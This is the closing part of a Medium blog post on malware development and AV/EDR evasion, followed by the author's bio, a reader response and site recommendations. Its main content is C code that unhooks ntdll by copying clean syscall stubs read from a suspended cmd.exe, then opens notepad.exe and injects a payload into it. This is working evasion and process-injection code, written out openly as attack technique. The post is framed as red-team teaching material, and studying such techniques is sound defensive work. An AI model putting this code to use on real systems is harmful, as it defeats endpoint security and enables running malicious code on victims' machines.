   DWORD SC_start = FindFirstSyscall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
   DWORD SC_end = FindLastSysCall((char *) pCache, pImgSectionHead->Misc.VirtualSize);

   if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
    DWORD SC_size = SC_end - SC_start;
    printf("dst (in ntdll): %p\n", ((DWORD_PTR) hNtdll + SC_start));
    printf("src (in cache): %p\n", ((DWORD_PTR) pCache + SC_start));
    printf("size: %i\n", SC_size);
    getchar();
    memcpy( (LPVOID)((DWORD_PTR) hNtdll + SC_start),
      (LPVOID)((DWORD_PTR) pCache + + SC_start),
      SC_size);
   }

   // restore original protection settings of ntdll
   VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
       pImgSectionHead->Misc.VirtualSize,
       oldprotect,
       &oldprotect);
   if (!oldprotect) {
     // it failed
     return -1;
   }
   return 0;
  }
 }

 // failed? .text not found!
 return -1;
}

int main(void) {

 int pid = 0;
    HANDLE hProc = NULL;
 int ret = 0;

 STARTUPINFOA si = { 0 };
 PROCESS_INFORMATION pi = { 0 };

 BOOL success = CreateProcessA(
  NULL,
  (LPSTR)"cmd.exe",
  NULL,
  NULL,
  FALSE,
  CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
  //CREATE_NEW_CONSOLE,
  NULL,
  "C:\\Windows\\System32\\",
  &si,
  &pi);

 if (success == FALSE) {
  printf("[!] Error: Could not call CreateProcess\n");
  return 1;
 }

 // get the size of ntdll module in memory
 char * pNtdllAddr = (char *) GetModuleHandle("ntdll.dll");
 IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) pNtdllAddr;
 IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (pNtdllAddr + pDosHdr->e_lfanew);
 IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;

 SIZE_T ntdll_size = pOptionalHdr->SizeOfImage;

 // allocate local buffer to hold temporary copy of clean ntdll from remote process
 LPVOID pCache = VirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);

 printf("ntdll size: %x | cache: %p\n", ntdll_size, pCache);

 SIZE_T bytesRead = 0;
 if (!ReadProcessMemory(pi.hProcess, pNtdllAddr, pCache, ntdll_size, &bytesRead))
  printf("Error reading: %d | %x\n", bytesRead, GetLastError());

 printf("Kill?"); getchar();

 TerminateProcess(pi.hProcess, 0);

 printf("Done.\n"); getchar();

 // remove hooks
 printf("Unhooking ntdll\n");
 ret = UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), pCache);

 printf("YAY!\n"); getchar();

 // Clean up.
 VirtualFree(pCache, 0, MEM_RELEASE);

 pid = FindTarget("notepad.exe");

 if (pid) {
  printf("Notepad.exe PID = %d\n", pid);

  // try to open target process
  hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
      PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
      FALSE, (DWORD) pid);

  if (hProc != NULL) {
   Inject(hProc, payload, payload_len);
   CloseHandle(hProc);
  }
 }
 return 0;
}
```

And that concludes our discussion of unhooking techniques. In the next section, we will explore the topic of Hiding Process Memory. Thank you for reading and showing interest in this subject.

Thanks for reading !

[Hacking](https://medium.com/tag/hacking?source=post_page-----3229b75618f7---------------------------------------)

[Av Evasion](https://medium.com/tag/av-evasion?source=post_page-----3229b75618f7---------------------------------------)

[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----3229b75618f7---------------------------------------)

[Red Teaming](https://medium.com/tag/red-teaming?source=post_page-----3229b75618f7---------------------------------------)

[Malware Analysis](https://medium.com/tag/malware-analysis?source=post_page-----3229b75618f7---------------------------------------)

[![Hossam Ehab](https://miro.medium.com/v2/resize:fill:48:48/1*dmbNkD5D-u45r44go_cf0g.png)](https://medium.com/@0xHossam?source=post_page---post_author_info--3229b75618f7---------------------------------------)

[![Hossam Ehab](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)](https://medium.com/@0xHossam?source=post_page---post_author_info--3229b75618f7---------------------------------------)

Follow

[**Written by Hossam Ehab**](https://medium.com/@0xHossam?source=post_page---post_author_info--3229b75618f7---------------------------------------)

[638 followers](https://medium.com/@0xHossam/followers?source=post_page---post_author_info--3229b75618f7---------------------------------------)

· [101 following](https://medium.com/@0xHossam/following?source=post_page---post_author_info--3229b75618f7---------------------------------------)

Red Team Operator @ Cyshield. LinkedIn -> [linkedin.com/in/0xHossam](http://linkedin.com/in/0xHossam) \| interested in malware & windows security research \| [x.com/0xHossam](http://x.com/0xHossam)

Follow

## Responses (1)

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

Write a response

[What are your thoughts?](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Funhooking-memory-object-hiding-3229b75618f7&source=---post_responses--3229b75618f7---------------------respond_sidebar------------------)

Cancel

Respond

[![Security geek](https://miro.medium.com/v2/resize:fill:32:32/1*YQGwtpOGecZajkbh2HMMGA.jpeg)](https://medium.com/@ezqoxzx395?source=post_page---post_responses--3229b75618f7----0-----------------------------------)

[Security geek](https://medium.com/@ezqoxzx395?source=post_page---post_responses--3229b75618f7----0-----------------------------------)

[Dec 19, 2024](https://medium.com/@ezqoxzx395/very-cool-technique-c3d83ae6c5b3?source=post_page---post_responses--3229b75618f7----0-----------------------------------)

```
Very cool technique
```

Reply

## More from Hossam Ehab

![PowerShell Exploits — Modern APTs and Their Malicious Scripting Tactics](https://miro.medium.com/v2/resize:fit:679/format:webp/1*x-Znot5b8frVpDTar4310A.jpeg)

[![Hossam Ehab](https://miro.medium.com/v2/resize:fill:20:20/1*dmbNkD5D-u45r44go_cf0g.png)](https://medium.com/@0xHossam?source=post_page---author_recirc--3229b75618f7----0---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------)

[Hossam Ehab](https://medium.com/@0xHossam?source=post_page---author_recirc--3229b75618f7----0---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------)

Feb 14, 2025

[A clap icon890\\
\\
A response icon6](https://medium.com/@0xHossam/powershell-exploits-modern-apts-and-their-malicious-scripting-tactics-7f98b0e8090c?source=post_page---author_recirc--3229b75618f7----0---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------)

![AV/EDR Evasion | Malware Development](https://miro.medium.com/v2/resize:fit:679/format:webp/1*8PfEF1XfP6QdDN-owGlEyg.png)

[![Hossam Ehab](https://miro.medium.com/v2/resize:fill:20:20/1*dmbNkD5D-u45r44go_cf0g.png)](https://medium.com/@0xHossam?source=post_page---author_recirc--3229b75618f7----1---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------)

[Hossam Ehab](https://medium.com/@0xHossam?source=post_page---author_recirc--3229b75618f7----1---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------)

Feb 17, 2023

[A clap icon720\\
\\
A response icon1](https://medium.com/@0xHossam/av-edr-evasion-malware-development-933e50f47af5?source=post_page---author_recirc--3229b75618f7----1---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------)

![Evading Detection and Stealthy Data Exfiltration with DNS over HTTPS (DoH)](https://miro.medium.com/v2/resize:fit:679/format:webp/0*ZSN3XwGdRR1AsG8-)

[![Hossam Ehab](https://miro.medium.com/v2/resize:fill:20:20/1*dmbNkD5D-u45r44go_cf0g.png)](https://medium.com/@0xHossam?source=post_page---author_recirc--3229b75618f7----2---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------)

[Hossam Ehab](https://medium.com/@0xHossam?source=post_page---author_recirc--3229b75618f7----2---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------)

Jun 27, 2024

[A clap icon564](https://medium.com/@0xHossam/evading-detection-and-stealthy-data-exfiltration-with-dns-over-https-doh-ee134b5766d4?source=post_page---author_recirc--3229b75618f7----2---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------)

![AV/EDR Evasion | Malware Development P — 4](https://miro.medium.com/v2/resize:fit:679/format:webp/1*i1XzohCsf11bGfwe9IyaeQ.png)

[![Hossam Ehab](https://miro.medium.com/v2/resize:fill:20:20/1*dmbNkD5D-u45r44go_cf0g.png)](https://medium.com/@0xHossam?source=post_page---author_recirc--3229b75618f7----3---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------)

[Hossam Ehab](https://medium.com/@0xHossam?source=post_page---author_recirc--3229b75618f7----3---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------)

May 27, 2023

[A clap icon419\\
\\
A response icon1](https://medium.com/@0xHossam/av-edr-evasion-malware-development-p-4-162662bb630e?source=post_page---author_recirc--3229b75618f7----3---------------------7364dac9_6352_481d_8ca5_16efd798d146--------------)

[See all from Hossam Ehab](https://medium.com/@0xHossam?source=post_page---author_recirc--3229b75618f7---------------------------------------)

## Recommended from Medium

![Active Directory Lab for PenTest. Manual Deployment Guide](https://miro.medium.com/v2/resize:fit:679/format:webp/1*x0k_83ZQ3gz3KTVqHE3BGQ.png)

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:20:20/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://medium.com/bugbountywriteup?source=post_page---read_next_recirc--3229b75618f7----0---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------)

In

[InfoSec Write-ups](https://medium.com/bugbountywriteup?source=post_page---read_next_recirc--3229b75618f7----0---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------)

by

[Andrey Pautov](https://medium.com/@1200km?source=post_page---read_next_recirc--3229b75618f7----0---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------)

Jan 24

[A clap icon11\\
\\
A response icon2](https://medium.com/bugbountywriteup/active-directory-lab-for-pentest-manual-deployment-guide-cab28cd4ad8d?source=post_page---read_next_recirc--3229b75618f7----0---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------)

![30 Days of Red Team: Day 19 — Network Pivoting: Reaching the Unreachable](https://miro.medium.com/v2/resize:fit:679/format:webp/1*KFHwqIAhrhLp6WjHcWRpbw.png)

[![30 Days of Red Team](https://miro.medium.com/v2/resize:fill:20:20/1*mDDxZ8b9SAK4X34fO8PVLQ.png)](https://medium.com/30-days-of-red-team?source=post_page---read_next_recirc--3229b75618f7----1---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------)

In

[30 Days of Red Team](https://medium.com/30-days-of-red-team?source=post_page---read_next_recirc--3229b75618f7----1---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------)

by

[Maxwell Cross](https://medium.com/@maxwellcross?source=post_page---read_next_recirc--3229b75618f7----1---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------)

Jan 24

[A clap icon7](https://medium.com/30-days-of-red-team/30-days-of-red-team-day-19-network-pivoting-reaching-the-unreachable-bd082b3906a2?source=post_page---read_next_recirc--3229b75618f7----1---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------)

![Using a Golang Shellcode Loader with Sliver C2 to Evade Antivirus](https://miro.medium.com/v2/resize:fit:679/format:webp/1*dBX24yL9U5zRKFYVqkjS_g.png)

[![lainkusanagi](https://miro.medium.com/v2/resize:fill:20:20/1*VzJHRBQO-U0LwAINk4bE1A.png)](https://medium.com/@luisgerardomoret_69654?source=post_page---read_next_recirc--3229b75618f7----0---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------)

[lainkusanagi](https://medium.com/@luisgerardomoret_69654?source=post_page---read_next_recirc--3229b75618f7----0---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------)

Jan 17

[A clap icon46](https://medium.com/@luisgerardomoret_69654/using-a-golang-shellcode-loader-with-sliver-c2-for-evasion-43a95f5ebc35?source=post_page---read_next_recirc--3229b75618f7----0---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------)

![React2Shell: The Critical Vulnerability That Shook the JavaScript World](https://miro.medium.com/v2/resize:fit:679/format:webp/eca3d3b5fb936ab346077b194b08a6b17f33c89eb76924469d110fa41d232cd3)

[![Aditya Kumar Tiwari](https://miro.medium.com/v2/resize:fill:20:20/1*BFLrjGA7JW2WJO7fUQD-_Q.png)](https://medium.com/@adityatiwariblogs?source=post_page---read_next_recirc--3229b75618f7----1---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------)

[Aditya Kumar Tiwari](https://medium.com/@adityatiwariblogs?source=post_page---read_next_recirc--3229b75618f7----1---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------)

Dec 18, 2025

![The 10 Most Dangerous Hacking Devices](https://miro.medium.com/v2/resize:fit:679/format:webp/0*EvUcSFz7nwl2LSWK)

[![MeetCyber](https://miro.medium.com/v2/resize:fill:20:20/1*Py7yoqD6dCYkTd_BffygCg.png)](https://medium.com/meetcyber?source=post_page---read_next_recirc--3229b75618f7----2---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------)

In

[MeetCyber](https://medium.com/meetcyber?source=post_page---read_next_recirc--3229b75618f7----2---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------)

by

[mohandika](https://medium.com/@theceosmind?source=post_page---read_next_recirc--3229b75618f7----2---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------)

Jan 23

[A clap icon295\\
\\
A response icon10](https://medium.com/meetcyber/the-10-most-dangerous-hacking-devices-d75af50c0122?source=post_page---read_next_recirc--3229b75618f7----2---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------)

![Evading Windows Security: A Story of AppLocker Bypass Technique with PowerShell](https://miro.medium.com/v2/resize:fit:679/format:webp/0*lE1Vn4n4nSdhF1dL.png)

[![R3dLevy](https://miro.medium.com/v2/resize:fill:20:20/1*dGw6joxOuLZ0s8ygPWmixA.png)](https://medium.com/@R3dLevy?source=post_page---read_next_recirc--3229b75618f7----3---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------)

[R3dLevy](https://medium.com/@R3dLevy?source=post_page---read_next_recirc--3229b75618f7----3---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------)

Oct 22, 2025

[A clap icon6](https://medium.com/@R3dLevy/evading-windows-security-a-story-of-applocker-bypass-technique-with-powershell-0cfc689a5916?source=post_page---read_next_recirc--3229b75618f7----3---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------)

[See more recommendations](https://medium.com/?source=post_page---read_next_recirc--3229b75618f7---------------------------------------)

[Help](https://help.medium.com/hc/en-us?source=post_page-----3229b75618f7---------------------------------------)

[Status](https://status.medium.com/?source=post_page-----3229b75618f7---------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----3229b75618f7---------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----3229b75618f7---------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----3229b75618f7---------------------------------------)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----3229b75618f7---------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----3229b75618f7---------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----3229b75618f7---------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----3229b75618f7---------------------------------------)

reCAPTCHA

Recaptcha requires verification.

[Privacy](https://www.google.com/intl/en/policies/privacy/) \- [Terms](https://www.google.com/intl/en/policies/terms/)

protected by **reCAPTCHA**

[Privacy](https://www.google.com/intl/en/policies/privacy/) \- [Terms](https://www.google.com/intl/en/policies/terms/)